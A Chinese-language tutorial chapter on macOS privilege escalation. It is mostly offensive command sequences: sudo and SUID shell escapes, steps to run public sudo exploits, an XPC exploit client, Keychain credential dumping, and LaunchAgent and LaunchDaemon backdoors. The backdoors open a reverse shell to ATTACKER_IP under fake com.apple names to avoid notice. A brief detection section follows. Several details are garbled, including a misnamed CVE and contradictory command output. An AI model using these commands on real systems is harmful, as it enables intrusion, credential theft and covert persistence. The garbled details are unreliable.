---
title: "macOS权限提升实战"
type: docs
weight: 2
---

## macOS权限提升实战

macOS的权限提升路径与Linux有本质区别。Apple在硬件和软件层面叠加了多层防御：Secure Boot确保引导链可信，SIP锁死系统目录，TCC控制应用对隐私数据的访问，Gatekeeper拦截未签名代码。这些机制相互咬合，单独突破其中一层往往不够——你需要理解整条攻击链才能真正拿到持久的root权限。

本章从信息收集开始，依次覆盖sudo滥用、内核漏洞利用、SIP绕过、TCC绕过、XPC服务攻击、Keychain提取、Launch Agent持久化等核心路径，最后给出检测与防御建议。每个技术点都配有可复现的操作步骤和真实CVE案例。

### 攻击面概览

在macOS上提权，攻击面可以分为五个层次：

| 层次 | 目标 | 典型技术 |
|------|------|----------|
| 应用层 | 第三方应用提权 | XPC劫持、dylib注入、TCC绕过 |
| 系统层 | sudo/setuid提权 | sudo漏洞、SUID滥用、sudoers配置错误 |
| 内核层 | 内核漏洞 | 内核UAF、堆溢出、类型混淆 |
| 硬件层 | 固件/启动链 | checkm8、Pangu SEP漏洞 |
| 配置层 | 安全策略绕过 | SIP绕过、Gatekeeper绕过、AMFI绕过 |

### 信息收集

拿到一台macOS机器的低权限shell后，第一步是摸清环境。信息收集的质量直接决定后续提权路径的选择。

#### 系统基本信息

```bash
# macOS版本和构建号——决定哪些CVE可用
sw_vers
# 输出示例：
# ProductName:    macOS
# ProductVersion: 13.4
# BuildVersion:   22F66

# 内核版本——内核漏洞利用需要精确匹配
uname -r
sysctl kern.version

# 硬件型号——区分Intel和Apple Silicon
sysctl hw.model
# Intel: MacBookPro16,1
# Apple Silicon: MacBookPro18,3

# 架构确认
uname -m
# x86_64 = Intel
# arm64 = Apple Silicon
```

Intel和Apple Silicon的提权路径差异很大。Apple Silicon有AMCC内存控制器和KTRR内核只读保护，内核漏洞利用的难度比Intel高一个量级。SIP在两种架构上机制相同，但Apple Silicon的Secure Boot链更严格。

#### 安全机制状态检查

```bash
# SIP（系统完整性保护）——最关键的防御
csrutil status
# 正常输出：System Integrity Protection status: enabled.
# 如果是disabled，恭喜，SIP保护下的所有路径全部打开

# Gatekeeper——拦截未签名应用
spctl --status
# assessments enabled = 正常
# assessments enabled = 已关闭

# FileVault——全盘加密
fdesetup status
# FileVault is On. = 加密已启用（离线攻击困难）
# FileVault is Off. = 明文磁盘（可以直接读取其他用户数据）

# 防火墙
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate

# XProtect（内置杀毒）
system_profiler SPInstallHistoryDataType | grep -A2 "XProtect"

# 安全启动策略（Apple Silicon）
sudo bputil -d  # 显示当前启动安全性策略
```

#### 用户与权限枚举

```bash
# 当前用户身份和组
id
# uid=501(testuser) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),80(admin)

# 注意groups里的admin——如果是admin组，可以通过sudo获取root
# admin组成员默认有sudo权限

# 列出所有用户
dscl . list /Users | grep -v "^_"

# 检查当前用户的sudo权限
sudo -l
# 这条命令极其重要——它直接告诉你能sudo执行哪些命令

# 检查哪些用户有admin权限
dscl . read /Groups/admin GroupMembership

# 检查哪些用户有sudoers条目
cat /etc/sudoers 2>/dev/null || sudo cat /etc/sudoers
```

#### 已安装应用与服务枚举

```bash
# 已安装应用——寻找已知漏洞版本
ls /Applications/
system_profiler SPApplicationsDataType

# 正在运行的进程——寻找高权限进程
ps aux | grep -E "root|_windowserver|_spotlight"

# Launch Daemons（系统级，root运行）
ls /Library/LaunchDaemons/
# 这些plist文件指定了以root身份运行的服务

# Launch Agents（用户级，当前用户运行）
ls ~/Library/LaunchAgents/
ls /Library/LaunchAgents/

# 检查可写的Launch Daemon——如果daemon指向的程序可写，可以替换
ls -la /Library/LaunchDaemons/

# 检查SUID文件
find / -perm -4000 -type f 2>/dev/null
# macOS默认有不少SUID文件，重点关注非Apple签名的

# 检查SGID文件
find / -perm -2000 -type f 2>/dev/null
```

#### 网络信息收集

```bash
# 本机IP和网络接口
ifconfig
networksetup -listallhardwareports

# 监听端口
netstat -an | grep LISTEN
lsof -i -P -n | grep LISTEN

# ARP表——局域网主机发现
arp -a

# DNS配置
scutil --dns

# 共享服务——可能暴露攻击面
sharing -l
```

#### 常用提权检查脚本

手动检查容易遗漏，用自动化脚本做全面扫描：

```bash
# PEASS (Privilege Escalation Awesome Scripts Suite)
# macOS版本的linpeas
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# 或者手动下载后执行
chmod +x linpeas.sh
./linpeas.sh | tee linpeas_output.txt

# 重点关注linpeas输出中标红的内容
```

### sudo漏洞利用

sudo是Unix系统中最常被攻击的SUID程序。macOS自带sudo，版本通常滞后于上游，历史上出现过多个严重漏洞。

#### CVE-2021-3156（Baron Samedit）

这个漏洞影响sudo 1.8.2到1.9.5p1，通过堆溢出实现root提权。macOS上受影响的版本需要确认。

```bash
# 检查sudo版本
sudo --version
# Sudo version 1.9.12p2  ← 检查是否在受影响范围内

# 检查是否可利用——如果sudoedit以root身份运行且不带参数时报错，说明可能可利用
sudoedit -s '\' $(python3 -c "print('A'*65536)")
# 如果报错"malloc"相关，说明触发了堆溢出

# 利用步骤
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
make
./sudo-hax-me-a-sandwich

# 不同目标需要选择不同的target编号
# ./sudo-hax-me-a-sandwich 会列出可用的target
# 需要根据sudo版本和OS版本选择正确的target
```

CVE-2021-3156的核心原理是sudoedit在解析命令行参数时，对反斜杠转义字符的处理存在堆溢出。攻击者通过精心构造的参数，覆盖堆上的sudoers规则结构体，最终将当前用户加入sudoers。

#### CVE-2023-22809（sudoedit绕过）

影响sudo 1.8.0到1.9.12p1。允许用户通过sudoedit编辑任意文件，即使sudoers中没有配置该文件的编辑权限。

```bash
# 检查sudo版本
sudo --version

# 利用方法：通过EDITOR环境变量注入额外文件
# 如果sudoers允许 sudoedit /some/file
# 可以这样绕过：
EDITOR="vim -- /etc/passwd" sudoedit /some/file
# 实际编辑的是/etc/passwd而不是/some/file

# 更直接的利用——修改sudoers给自己加权限
EDITOR="vim -- /etc/sudoers" sudoedit /tmp/dummy
# 在sudoers中添加：youruser ALL=(ALL) NOPASSWD: ALL
```

#### sudo配置错误利用

实际渗透中，sudo配置错误比sudo漏洞更常见。很多macOS工作站的管理员为了方便，给普通用户配置了过度宽松的sudo权限。

```bash
# 查看当前用户可以sudo执行的命令
sudo -l
```

**场景一：NOPASSWD + 命令注入**

如果sudoers配置了`(ALL) NOPASSWD: /usr/bin/vim`：

```bash
# vim可以执行shell命令
sudo vim -c ':!/bin/bash'
# 直接拿到root shell

# 更隐蔽的方式
sudo vim
# 在vim中输入 :!/bin/sh
```

**场景二：编程语言解释器**

```bash
# Python
sudo python3 -c 'import os; os.system("/bin/bash")'
sudo python3 -c 'import pty; pty.spawn("/bin/bash")'

# Perl
sudo perl -e 'exec "/bin/bash";'
sudo perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'

# Ruby
sudo ruby -e 'exec "/bin/bash"'

# Node.js
sudo node -e 'require("child_process").spawn("/bin/bash", {stdio: "inherit"})'
```

**场景三：分页器/编辑器逃逸**

```bash
# less/more
sudo less /etc/shadow
# 在less中输入 !bash  或  !sh

# man
sudo man man
# 在man中输入 !bash

# awk
sudo awk 'BEGIN {system("/bin/bash")}'

# find
sudo find / -exec /bin/bash \; -quit

# env
sudo env /bin/bash

# nmap（旧版本支持交互式模式）
sudo nmap --interactive
# nmap> !bash
```

**场景四：包管理器滥用**

```bash
# 如果可以sudo apt/brew
sudo brew install something  # 可以控制安装脚本

# dpkg/rpm同理
```

[GTFOBins](https://gtfobins.github.io/) 收录了几乎所有Unix程序的sudo逃逸方法，是渗透测试的必备参考。

### SUID与特权程序利用

macOS上SUID提权的思路和Linux基本一致，但有一些macOS特有的细节。

#### 查找SUID文件

```bash
find / -perm -4000 -type f 2>/dev/null

# macOS上常见的SUID文件：
# /usr/bin/sudo
# /usr/bin/su
# /usr/bin/passwd
# /usr/bin/chsh
# /usr/bin/chfn
# /usr/bin/top（旧版本macOS）
# /usr/libexec/security_authtrampoline
```

#### 检查SUID程序的动态库加载

```bash
# 检查SUID程序依赖的动态库
otool -L /path/to/suid_binary

# 检查rpath（运行时搜索路径）
otool -l /path/to/suid_binary | grep -A2 LC_RPATH

# 如果SUID程序使用@rpath加载库，且rpath指向可写目录
# 可以在该目录放置恶意dylib
```

#### DYLD环境变量攻击（仅限SIP关闭）

macOS的dyld（动态链接器）支持几个环境变量来控制库加载。在SIP开启的情况下，这些环境变量在特权程序中被忽略。但如果SIP关闭或针对非Apple的SUID程序：

```bash
# DYLD_INSERT_LIBRARIES——类似于Linux的LD_PRELOAD
export DYLD_INSERT_LIBRARIES=/path/to/malicious.dylib
/suid/binary

# DYLD_LIBRARY_PATH——控制库搜索路径
export DYLD_LIBRARY_PATH=/malicious/lib
/suid/binary
```

注意：macOS对SUID程序有特殊保护。即使是SIP关闭状态，Apple签名的SUID程序也会忽略DYLD环境变量。只有第三方SUID程序才可能受影响。

### SIP绕过

SIP（System Integrity Protection）是macOS最重要的防御机制之一。它保护`/System`、`/usr`、`/bin`、`/sbin`等系统目录不被修改，即使是root也无法绕过。绕过SIP是macOS提权中的"圣杯"。

#### SIP的工作原理

SIP通过内核强制执行以下规则：
- 受保护目录不能被写入（即使是root）
- 受保护进程不能被调试或注入
- 内核扩展必须由Apple或已知开发者签名
- 文件不能被设置NOSIMMUTABLE标志之外的系统文件标志

验证SIP状态：

```bash
csrutil status
# System Integrity Protection status: enabled.
#   Configuration:
#     Apple Internal: disabled
#     Kext Signing: enabled
#     Filesystem Protections: enabled
#     Debugging Restrictions: enabled
#     DTrace Restrictions: enabled
#     NVRAM Protections: enabled
#     BaseSystem Verification: enabled
```

每个子策略都可以独立配置，这在某些场景下提供了攻击面。

#### CVE-2021-30892（Shovelload）

这是一个影响macOS Big Sur和Monterey的SIP绕过漏洞。利用macOS Installer子系统的逻辑缺陷，在SIP保护的目录中写入任意文件。

```bash
# 漏洞利用思路：
# 1. macOS Installer在安装过程中会调用system_installd
# 2. 这个守护进程具有绕过SIP的特殊权限
# 3. 通过构造特殊的安装包，可以利用它在受保护目录写入文件

# PoC思路（简化版）：
# 创建一个使用pre/post install脚本的pkg
# 脚本在installd的上下文中执行，拥有绕过SIP的权限
# 利用符号链接或race condition将文件写入受保护位置
```

#### CVE-2022-22583（PackageKit SIP绕过）

通过PackageKit框架的符号链接跟随漏洞绕过SIP：

```bash
# 漏洞原理：
# system_installd在处理安装包时跟随符号链接
# 攻击者创建一个指向SIP保护目录的符号链接
# installd将文件写入符号链接目标，从而绕过SIP保护

# 利用步骤：
# 1. 准备一个恶意pkg
# 2. pkg内的payload包含符号链接
# 3. 安装时installd跟随符号链接写入受保护目录
```

#### CVE-2023-32369（Migrator SIP绕过）

利用系统迁移助手（Migration Assistant）中的逻辑缺陷绕过SIP：

```bash
# Migration Assistant的com.apple.migrationhelper具有绕过SIP的特殊权限
# 通过构造特殊的迁移数据，可以利用它在受保护目录写入文件
```

#### 常见SIP绕过模式

大多数SIP绕过利用的是拥有特殊权限（com.apple.rootless.install或类似entitlement）的Apple系统组件。攻击模式通常是：

1. 找到一个具有SIP绕过entitlement的系统进程/服务
2. 通过XPC、文件系统或环境控制来影响该进程的行为
3. 让该进程在SIP保护目录中写入攻击者控制的内容

```bash
# 查找具有rootless相关entitlement的二进制文件
find /usr /System -type f -perm -4000 2>/dev/null -exec codesign -d --entitlements - {} \; 2>/dev/null | grep -B1 "rootless"

# 查找具有com.apple.rootless.install entitlement的进程
codesign -d --entitlements - /System/Library/PrivateFrameworks/PackageKit.framework/Versions/A/Resources/system_installd 2>/dev/null
```

### TCC绕过

TCC（Transparency, Consent, and Control）是macOS的隐私保护框架。它控制应用对摄像头、麦克风、文件系统、屏幕录制等敏感资源的访问。TCC数据库存储在`~/Library/Application Support/com.apple.TCC/TCC.db`中，且受SIP保护。

#### TCC的工作机制

TCC通过以下方式保护资源：
- 应用首次访问受保护资源时弹出授权对话框
- 用户可以授予或拒绝权限
- 授权信息存储在TCC.db中
- 部分权限（如辅助功能）需要用户在系统设置中手动开启

#### 通过Accessibility权限绕过

如果用户授予了某应用辅助功能权限，该应用可以控制其他应用的UI：

```bash
# 检查辅助功能权限
osascript -e 'tell application "System Events" to return name of every process'

# 如果有辅助功能权限，可以通过AppleScript控制Finder
# 让Finder以root权限执行操作（利用Finder的特权操作）

osascript << 'EOF'
tell application "Finder"
    -- 利用Finder的特权操作访问受保护文件
end tell
EOF
```

#### 通过已授权应用提权

如果一个已授权TCC权限的应用存在漏洞，可以利用该应用间接获取权限：

```bash
# 列出已有TCC权限的应用
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
  "SELECT client,service,allowed FROM access WHERE allowed=1;"

# 如果某个已授权辅助功能的应用可以加载插件或脚本
# 可以通过该应用间接执行操作
```

#### 通过symlink/hardlink绕过TCC

某些TCC版本存在符号链接跟随漏洞：

```bash
# 利用思路：
# 1. 创建一个指向TCC保护位置的符号链接
# 2. 让已授权的应用通过符号链接访问数据
# 3. 间接获取TCC保护的数据

# 典型利用：访问桌面上的文件
# TCC保护Desktop、Documents、Downloads目录
# 如果某个应用有这些目录的访问权限，可以通过它间接读取
```

#### CVE-2020-9934（TCC数据库绕过）

通过移动TCC数据库绕过保护：

```bash
# 漏洞原理：
# TCC检查进程的bundle ID来决定权限
# 如果进程没有bundle ID，TCC回退到检查可执行文件路径
# 攻击者可以将TCC.db复制到自己的目录，修改权限后替换

# 注意：这个漏洞在较新版本中已修复
# TCC.db现在受SIP保护，无法直接修改
```

### XPC服务攻击

XPC是macOS的进程间通信机制。大量系统服务和第三方应用通过XPC暴露功能接口。如果XPC服务没有正确验证调用者身份，低权限进程可以调用高权限服务执行特权操作。

#### XPC服务枚举

```bash
# 列出所有注册的XPC服务
launchctl list | grep -v "^\-"

# 查找第三方XPC服务
ls /Library/PrivilegedHelperTools/
ls ~/Library/Services/

# 检查XPC服务的entitlements
codesign -d --entitlements - /path/to/xpc/service

# 使用Activity Monitor查看进程的XPC连接
# 或者使用工具如xpcspy
```

#### XPC服务漏洞利用模式

XPC服务漏洞的常见模式：

1. **未验证调用者身份**：服务接受任何XPC连接
2. **不完整的代码签名验证**：只检查bundle ID而不验证签名
3. **TOCTOU（检查时间/使用时间）竞争**：验证时通过检查，实际执行时已被替换

```bash
# 检查XPC服务是否验证调用者
# 1. 查看服务的entitlements
codesign -d --entitlements - /path/to/service

# 2. 检查是否使用xpc_connection_get_audit_token
# 如果没有验证audit token，说明未验证调用者

# 3. 检查是否使用SecCodeCopySigningInformation验证签名
# 如果只检查了bundle ID，可以伪造
```

#### 编写XPC客户端利用代码

```objectivec
// 利用未验证调用者的XPC服务
#import <Foundation/Foundation.h>

int main() {
    // 连接到目标XPC服务
    xpc_connection_t connection = xpc_connection_create_mach_service(
        "com.vulnerable.privileged_helper",
        NULL,
        XPC_CONNECTION_MACH_SERVICE_PRIVILEGED
    );
    
    xpc_connection_set_event_handler(connection, ^(xpc_object_t event) {
        // 处理响应
    });
    
    xpc_connection_resume(connection);
    
    // 构造消息——具体格式取决于目标服务的协议
    xpc_object_t message = xpc_dictionary_create(NULL, NULL, 0);
    xpc_dictionary_set_string(message, "command", "execute");
    xpc_dictionary_set_string(message, "path", "/bin/bash");
    xpc_dictionary_set_string(message, "args", "-c,id");
    
    // 发送请求
    xpc_object_t reply = xpc_connection_send_message_with_reply_sync(connection, message);
    
    // 处理结果
    const char *result = xpc_dictionary_get_string(reply, "result");
    if (result) printf("Result: %s\n", result);
    
    return 0;
}
```

编译运行：

```bash
clang -framework Foundation -o xpc_exploit xpc_exploit.m
./xpc_exploit
```

### Keychain提取

macOS的Keychain存储了密码、证书、密钥等敏感数据。如果能提取Keychain内容，可以获取WiFi密码、网站凭据、应用密码等。

#### Keychain结构

macOS的Keychain文件存储在：

```bash
# 系统Keychain（SIP保护）
/System/Library/Keychains/SystemRootCertificates.keychain

# 用户Keychain（用户可读写）
~/Library/Keychains/login.keychain-db

# iCloud Keychain
~/Library/Keychains/*/keychain-2.db
```

#### 通过security命令提取

```bash
# 列出所有Keychain
security list-keychains

# 列出Keychain中的所有密码项
security dump-keychain -d ~/Library/Keychains/login.keychain-db
# 注意：这会弹出授权对话框——在渗透场景中不实用

# 查找特定密码
security find-generic-password -a "account_name" -s "server" -g
security find-internet-password -a "account_name" -s "server" -g

# 在有root权限后，可以无提示读取
sudo security dump-keychain -d ~/Library/Keychains/login.keychain-db
```

#### 工具辅助提取

```bash
# keychaindump——直接从内存读取Keychain主密钥
# 适用于较老的macOS版本
git clone https://github.com/juuso/keychaindump.git
cd keychaindump
make
sudo ./keychaindump

# Keychain-Dumper——更现代的工具
# 需要root权限或Keychain解锁状态
git clone https://github.com/ptoomey3/Keychain-Dumper.git
cd Keychain-Dumper
chmod +x keychain_dumper
sudo ./keychain_dumper

# LaZagne——跨平台凭据提取工具
# 支持macOS的Keychain、WiFi密码、浏览器密码等
python3 laziagne.py all
```

#### 利用Keychain的Access Control

每个Keychain条目都有访问控制列表（ACL），定义了哪些应用可以访问该密码：

```bash
# 查看特定条目的ACL
security dump-keychain -i ~/Library/Keychains/login.keychain-db
# 输出中会显示 "accc" 字段，列出允许访问的应用

# 如果ACL配置过于宽松（例如允许任何应用访问）
# 可以直接从任意进程读取密码
```

### 内核漏洞利用

内核漏洞利用是macOS提权的终极手段，但也最难利用。macOS内核（XNU）的安全加固使得现代版本的内核利用比Linux困难得多。

#### 内核漏洞利用的特殊挑战

macOS内核利用面临以下额外挑战：

| 保护机制 | 作用 | 影响 |
|----------|------|------|
| KTRR | 内核代码段只读 | 无法修改内核代码 |
| KASLR | 内核地址随机化 | 需要信息泄露 |
| PAN | 特权访问永不执行 | 无法直接从用户态读写内核内存 |
| SMAP | 管理模式访问保护 | 内核无法直接访问用户态内存 |
| PAC（Apple Silicon） | 指针认证 | 控制流劫持极其困难 |

#### 检查内核版本和可用漏洞

```bash
# 精确内核版本
uname -a
sysctl kern.version
sysctl kern.osrelease
# kern.osrelease: 22.6.0 对应 macOS 13.5

# 检查内核扩展
kextstat | grep -v com.apple
# 非Apple的内核扩展是潜在攻击面

# Apple Silicon上检查SIP对内核扩展的限制
csrutil authenticated-root status
```

#### 利用第三方内核扩展

第三方kext是最容易的内核攻击面：

```bash
# 列出已加载的第三方kext
kextstat | grep -v "com.apple"

# 检查kext的代码签名
codesign -vvv /Library/Extensions/ThirdParty.kext

# 检查kext的符号
nm /Library/Extensions/ThirdParty.kext/Contents/MacOS/ThirdParty

# 检查kext暴露的设备文件
ls -la /dev/ | grep thirdparty
```

#### 典型内核漏洞案例

**CVE-2021-30883（IOMobileFrameBuffer）**：一个影响iOS和macOS的内核堆溢出漏洞，通过IOKit用户客户端触发：

```bash
# IOMobileFrameBuffer是管理显示帧缓冲的内核扩展
# 漏洞存在于IOMobileFrameBuffer::set_gamma_table函数中
# 通过IOKit的用户态接口可以触发堆溢出

# 漏洞利用流程：
# 1. 打开IOMobileFrameBuffer的用户客户端
# 2. 通过IOConnectCall发送特制参数
# 3. 触发堆溢出，覆盖相邻的内核对象
# 4. 劫持控制流，执行特权shellcode
```

**CVE-2019-8605（SockPuppet）**：一个sockaddr结构体的UAF漏洞：

```bash
# 漏洞存在于内核的网络子系统
# 通过特殊的socket操作触发UAF
# 利用伪造的内核对象获取任意读写
# 最终修改进程凭证获取root
```

### Launch Agent/Daemon持久化

拿到root权限后，需要建立持久化机制确保重启后依然可以访问。

#### 用户级持久化（Launch Agent）

Launch Agent以当前用户身份运行，不需要root权限：

```bash
# Launch Agent plist目录
~/Library/LaunchAgents/

# 创建反向shell持久化
cat > ~/Library/LaunchAgents/com.apple.update.plist << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.update</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>-c</string>
        <string>bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
</dict>
</plist>
EOF

# 加载Agent
launchctl load ~/Library/LaunchAgents/com.apple.update.plist
```

注意plist命名技巧：使用`com.apple.*`前缀可以让Agent在进程列表中看起来像系统服务，降低被发现的概率。

#### 系统级持久化（Launch Daemon）

Launch Daemon以root身份运行，需要root权限创建：

```bash
# Launch Daemon目录
/Library/LaunchDaemons/

# 创建root级后门
cat > /Library/LaunchDaemons/com.apple.systemupdate.plist << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.systemupdate</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/local/bin/updater</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>UserName</key>
    <string>root</string>
</dict>
</plist>
EOF

# 创建后门程序
cat > /usr/local/bin/updater << 'SCRIPT'
#!/bin/bash
# 反向shell——连接到攻击者
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
SCRIPT
chmod +x /usr/local/bin/updater

# 加载Daemon
sudo launchctl load /Library/LaunchDaemons/com.apple.systemupdate.plist
```

#### 登录项持久化

```bash
# 通过AppleScript添加登录项
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/backdoor", hidden:true}'

# 或者通过defaults命令添加
# 登录项存储在 ~/Library/Preferences/com.apple.loginitems.plist
```

#### 其他持久化技术

```bash
# 1. crontab
echo "*/5 * * * * /path/to/backdoor" | crontab -

# 2. Shell配置文件（用户登录时执行）
echo "/path/to/backdoor &" >> ~/.zshrc
echo "/path/to/backdoor &" >> ~/.bash_profile

# 3. ssh authorized_keys（远程访问持久化）
echo "ATTACKER_PUBLIC_KEY" >> ~/.ssh/authorized_keys

# 4. Kext持久化（需要SIP关闭或特殊权限）
# 加载恶意内核扩展实现内核级持久化
```

### 检测与防御

从防御者视角理解这些攻击手段，有助于构建更安全的macOS环境。

#### 检测sudo滥用

```bash
# 监控sudo日志
log show --predicate 'process == "sudo"' --last 1h

# 监控sudoers文件变更
fs_usage -w -f filesys | grep sudoers

# 使用Endpoint Security框架监控提权行为
# 需要开发或使用已有的ES客户端
```

#### 检测Launch Agent/Daemon

```bash
# 监控Launch目录的变化
fswatch ~/Library/LaunchAgents/ /Library/LaunchDaemons/ /Library/LaunchAgents/

# 使用KnockKnock扫描持久化项目
# https://objective-see.org/products/knockknock.html

# 检查所有Launch Agent/Daemon的签名
find ~/Library/LaunchAgents /Library/LaunchDaemons /Library/LaunchAgents \
  -name "*.plist" -exec codesign -vvv {} \; 2>&1 | grep "invalid\|not signed"
```

#### 检测SIP状态变化

```bash
# SIP状态只能在恢复模式中修改
# 监控SIP状态变化
csrutil status

# 如果SIP被关闭，这本身就是重大安全事件
# 检查系统日志中的SIP相关条目
log show --predicate 'eventMessage contains "SIP"' --last 24h
```

#### 防御加固清单

| 措施 | 说明 | 优先级 |
|------|------|--------|
| 保持SIP启用 | 禁止在恢复模式中关闭SIP | 最高 |
| 及时更新系统 | 修补已知内核和系统漏洞 | 最高 |
| 审计sudoers | 移除不必要的NOPASSWD条目 | 高 |
| 启用FileVault | 防止离线数据提取 | 高 |
| 限制第三方kext | 使用MDM策略限制内核扩展安装 | 高 |
| 审计Launch目录 | 定期检查Launch Agents/Daemons | 中 |
| 使用MDM | 企业环境使用移动设备管理 | 中 |
| 监控XPC服务 | 检测异常的XPC连接 | 中 |

### 常见误区

**误区一：SIP关闭是小事**

SIP关闭意味着整个系统目录可写，所有DYLD保护失效，TCC保护失效。在渗透测试中，如果发现SIP关闭，基本等于已经拿到root——只需要一个简单的SUID滥用或DYLD注入。

**误区二：Apple Silicon和Intel的提权方法相同**

Apple Silicon引入了PAC（指针认证）、KTRR（内核只读）、AMCC（内存控制器）等硬件级保护。Intel上可行的很多内核利用技术在Apple Silicon上完全无效。

**误区三：macOS不需要杀毒**

macOS的XProtect只能检测已知恶意软件，对定向攻击无能为力。企业环境中应该部署EDR（端点检测与响应）解决方案。

**误区四：Gatekeeper能防止所有恶意软件**

Gatekeeper只在应用首次打开时检查签名。运行后的进程行为不受Gatekeeper控制。通过脚本和解释器执行的恶意代码完全绕过Gatekeeper。

### 实战案例：从低权限到root

以下是一个完整的提链示例，从普通用户到root：

```bash
# 步骤1：信息收集
$ id
uid=501(testuser) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts)

$ sudo -l
User testuser may run the following commands on thishost:
    (ALL) NOPASSWD: /usr/bin/python3

# 步骤2：发现sudo python3权限——直接提权
$ sudo python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# root shell获得

# 步骤3：验证
# whoami
root

# 步骤4：持久化——创建Launch Daemon
# cat > /Library/LaunchDaemons/com.apple.updater.plist << 'EOF'
# [... plist内容 ...]
# EOF
# launchctl load /Library/LaunchDaemons/com.apple.updater.plist

# 步骤5：提取凭据
# security dump-keychain -d /Users/testuser/Library/Keychains/login.keychain-db
```

另一条常见路径是通过SUID程序：

```bash
# 发现非标准SUID程序
$ find / -perm -4000 -type f 2>/dev/null | grep -v /usr/bin | grep -v /System
/usr/local/bin/custom_backup

# 检查这个程序
$ file /usr/local/bin/custom_backup
/usr/local/bin/custom_backup: Mach-O 64-bit executable x86_64

$ otool -L /usr/local/bin/custom_backup
/usr/local/bin/custom_backup:
    /usr/lib/libSystem.B.dylib

# 检查是否可以劫持库加载
$ otool -l /usr/local/bin/custom_backup | grep -A3 LC_RPATH

# 如果使用了@rpath且路径可写——放置恶意dylib
# 如果使用了DYLD_环境变量（SIP关闭时）——直接注入
```

### 工具与资源

| 工具 | 用途 | 链接 |
|------|------|------|
| linPEAS | 自动化提权检查 | github.com/peass-ng/PEASS-ng |
| GTFOBins | Sudo/SUID逃逸参考 | gtfobins.github.io |
| KnockKnock | 持久化项目扫描 | objective-see.org |
| BlockBlock | 持久化实时监控 | objective-see.org |
| RansomWhere? | 勒索软件检测 | objective-see.org |
| TaskExplorer | 进程分析 | objective-see.org |
| Keychain-Dumper | Keychain密码提取 | github.com/ptoomey3/Keychain-Dumper |
| LaZagne | 跨平台凭据提取 | github.com/AlessandroZ/LaZagne |
| macOS Security Compliance | 安全基线配置 | github.com/usnistgov/macos_security |

Objective-See基金会（Patrick Wardle维护）是macOS安全研究最重要的资源之一，其工具覆盖了持久化检测、恶意软件分析、漏洞发现等场景。在macOS安全领域，没有第二个同等量级的开源工具集合。
